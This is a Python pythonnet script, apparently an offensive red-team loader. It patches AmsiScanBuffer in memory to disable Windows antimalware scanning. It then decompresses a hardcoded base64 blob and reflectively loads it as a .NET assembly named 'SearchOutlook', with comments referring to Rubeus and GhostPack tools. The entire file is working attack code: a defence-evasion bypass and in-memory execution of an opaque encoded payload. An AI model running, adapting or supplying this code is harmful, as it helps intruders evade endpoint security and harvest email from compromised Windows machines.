import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SearchOutlook.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()